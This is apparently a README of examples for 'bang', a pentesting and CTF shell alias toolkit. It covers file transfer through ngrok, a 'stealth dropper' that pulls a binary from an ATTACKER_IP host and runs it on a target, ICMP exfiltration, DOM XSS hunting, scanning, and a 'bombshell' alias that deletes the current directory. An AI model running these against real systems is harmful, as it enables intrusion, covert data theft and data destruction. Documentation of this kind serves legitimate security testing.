# Examples

Some examples of bang usage

## `gitar`

### Share files

Start file sharing:
```
bang.gitar $AA
```
This will start a `gitar` http server and copy to your clipboard a command line to run on remote. Run it, you can now upload and download file from remote easily (without further installations [see](https://github.com/ariary/gitar/blob/main/README.md#tldr---and-listen-music)). 

#### Alternative 1 - Daemon
Launch gitar as a daemon, and kill it later when you want (=>no logs)
1. Start gitar: `bang.gitar.daemon $AA`(copy command line)
2. paste command line on remote
3. Do your stuff (`push`,`pull`, etc)
4. kill gitar: `bang.gitar.kill`

#### Alternative 2 - For `/bin/sh`
by default, `gitar` use completion. `/bin/sh` doesn't have `complete` enable. Hence launch gitar without this feature:
```
bang.gitar.no-completion $AA
```

### Share files safely

Same as above + inside a container + using https for encryption

Start safe file sharing:
```
bang.gitar-safe $AA
```

### Expose local file on internet

`ngrok` enable us to share local port on the internet. The idea is to start `gitar` server locally and then expose the local port on internet using `ngrok`

#### "Safe" version
***~>*** Expose local **HTTPS server** running in a **container**

1. Expose the server port on internet: `bang.expose-https 9237`
`ngrok` output the internet reachable address for your server. Note it (use `https` one preferably)
2. Start `gitar` HTTPS server in container: `bang.gitar-safe-override [NGROK_HTTPS_URL]`

If you have a browser you could now access to files on `[NGROK_HTTPS_URL]/pull`

If you have a shell you could load shortcut to upload/download file with:
```bash
curl -s [NGROK_HTTPS_URL]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias
```

#### "Unsafe" version
***~>*** Expose local **HTTP server**

1. Expose the server port on internet: `bang.expose 9237`
`ngrok` output the internet reachable address for your server. Note it (use `https` one preferably)
2. Start `gitar` HTTP server : `bang.gitar-override [NGROK_HTTPS_URL]`

If you have a browser you could now access to files on `[NGROK_HTTPS_URL]/pull`

If you have a shell you could load shortcut to upload/download file with:
```bash
curl -s [NGROK_HTTPS_URL]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias
```

*Notes: You could also use `python3 -m http.server 9237` to launch a server (only for "download file" use case)*

## `fileless-xec`

### Exec binary from a local HTTP server

This will launch an http server (to serve the local binary) and copy the `fileless-xec` command to paste on target machine:
```
bang.flx.client.cpy [ATTACKER_IP] [TARGET_PORT] [BINARY_NAME]
```
Now paste the command on target machine (to dl binary and stealthy execute it)

### Copy line to launch `fieleless-xec` stealth dropper

This will copy command line on your clipboard to launch fileless-xec on remote. (Previously, uploaded it to the remote machine)

```
bang.flxscpy
```

### Send a local file to remote `fileless-xec` to stealthy run it

This will send a local binary to a remote listening `fileless-xec`. The binary will be then executed (stealthy) on remote

```
bang.flxssend [TARGET_IP] [TARGET_PORT] [binary]
```

## `Queensono`

Exchange data using ICMP protocol

### Send a file trough ICMP

Send a file to `$TA`:
```
bang.queensono.send.file \$TA [FILENAME]
```
This will start a `gitar` http server and copy to your clipboard a command line to run on remote. Run it, you can now upload and download file from remote easily (without further installations [see](https://github.com/ariary/gitar/blob/main/README.md#tldr---and-listen-music)). 

#### Copy the line to send a file
```
bang.queensono.send.file.cpy $AA [FILENAME]
```

### Send a message trough ICMP
```
bang.queensono.send $TA "[MSG]"
```

#### Copy the line to send a message
```
bang.queensono.send.cpy $AA "[MSG]"
```

### Receive file trough ICMP
```
bang.queensono.receive.file [FILENAME]
```

#### Copy the line to receive file
```
bang.queensono.receive.file.cpy [FILENAME]
```

### Receive message trough ICMP
```
bang.queensono.receive
```

#### Copy the line to receive file
```
bang.queensono.receive.cpy
```

## `jse`

`jse` enables to gather js code from web pages

Perform curl request and extract js from it:
```
bang.jse.after-curl.verbose [url]
```

If you only want the neat part (js): `bang.jse.after-curl [url]`

Same thing with a terminal UI (TUI):
```
bang.jse.tui-after-curl [url]
```

### Find DOM XSS

To find sources in js code, use `fsource`:
```
bang.jse.after-curl [url] | fsource
```

Similary with `fsink` to find sinks:
```
bang.jse.after-curl [url] | fsink
```

To ease the js inspection, you could "[beautify](https://github.com/beautify-web/js-beautify)" the js code

## Webdav server

[see](https://blog.ropnop.com/docker-for-pentesters/#example-6---serving-files-over-webdav)

This enable us to share all files of current directory trough a webdav server

```
bang.webdavhere
```

You can now access file from a remote machine (Windows) with the UNC path: `\\[ATTACKER_ADDR]@[ATTACKER_PORT]\share`

You could eventually expose server behind a internet address using `ngrok` (if you are behdin an NAT for exemple):
```
bang.expose 8080
```
Access file: `\\[NGROK_URL]@\share`

## Get the weather of your city

```
bang.fun.weather [CITY]
```

## Intercept request with command line

We will use `mitm-proxy` which enable us to capture HTTP flow.

1. Set up your proxy:
    * If you want to catch request to a specific domains: `bang.mitmproxy.intercept.request.domain [DOMAIN]`
    * If you want to catch all request: `bang.mitmproxy.intercept.request`
2. Perform a curl request trough your proxy: `bang.proxycurl http://[DOMAIN]`

***TIPS:*** You could use alias `pup.script` to parse the response (html) and get only script code

### Modify request
You will catch it in your mitm-proxy. Navigate over it, press `<ENTER>`
To edit it press `e` and select the field you want to modify.
When you have finished your modification: `<ECHAP>`, then press `q`, then press `q`again (requests view) and press `a` to perform the request

### Repeat request

[See](https://docs.mitmproxy.org/stable/mitmproxytutorial-replayrequests/)


## Deploy local app with trusted cert
*> avoid curl `-k` option or warning in browser*

***1)*** First install mkcert root cert in your local trust store: `bang.mkcert.install`

***2)*** Then generate key and intermediate cert for a specific domain:
```
bang.mkcert.generate-cert [domain]
>>>>> IT WILL OUTPUT THE COMMAND LINE TO CHANGE DNS ENTRY (COPY & PASTE IT)
```
***3)*** Change DNS entry in `/etc/hosts`

***Enjoy:***
You can now join your local http service using ssl without warning or `-k` option.

Example: `curl https://[domain]` or `(&>/dev/null firefox https://[domain] &)`

***4)*** When you finish you task. Clean cert and so on:
```
bang.mkcert.uninstall
>>>>> IT WILL OUTPUT THE COMMAND LINE TO CHANGE DNS ENTRY BACK TO IT INITIAL STATUS (COPY & PASTE IT)
```

## `nmap` scan

Configure your pentest target before using these commands: `bang.conf.pentest`

* list all scripts of `nmap`: `bang.nmap.show-script
* Scan specific ports: `bang.nmap.scan-ports [to]-[from]` or for a unique port `nmapbang.nmap.scan-ports [port]`
* Perform a scan on the top 100 ports *(the level intensity is 5, this is for CTF use not for real world pentest)*: `bang.nmap.scan-top100`
* Discover alived host for a specific range: `bang.nmap.discovery`

## Web indexing

Configure your pentest target before using these commands: `bang.conf.pentest`

### Using `feroxbuster`
* Perform a basic feroxbuster scan: `bang.feroxbuster [url]` or `bang.feroxbuster https://$TA`
* Perform a basic feroxbuster scan and follow redirects: `feroxbuster.redirect [url]`
* Perform a feroxbuster scan to retrieve php,docx,doc,xml,json,pdf,txt,html and js files: `bang.feroxbuster.search-extensions [url]`
* Perform feroxbuster scan a filter on success response code: `bang.feroxbuster.only-success`

See more `bang.find feroxbuster`

### Web crawler

Web crawler for gathering URLs and JavaScript file locations: `bang.hakrawler [url]`


## Launch a bomb inside your tty

**Very dangerous**:
Launch a countdown inside your tty.. Wait till the bomb explode ... this will remove all files within the current directory:
```
bang.bombshell
```

## Exit vim line
Copy the line which will exit vim (useful when you are stuck in vim and can't find a way to get out):
```
bang.exit-vim.cpy
```

## Use `screen` to launch process in background

Launch a process in background:
```
bang.screen.launch-and-detach [cmd line launching process]
```

You can later reattach to the screen virtual terminal which was detached:
```
bang.screen.reattach
```

*Help: to list all existent screens: bang.screen.ls*

## Use `mkcert` to trust local certs

..TO DO..

## `bang` helpers

* See all available shortcuts and aliases: `bang.ls`
* Search for a shortcut in bang: `bang.find [shortcut]`

## Persistence
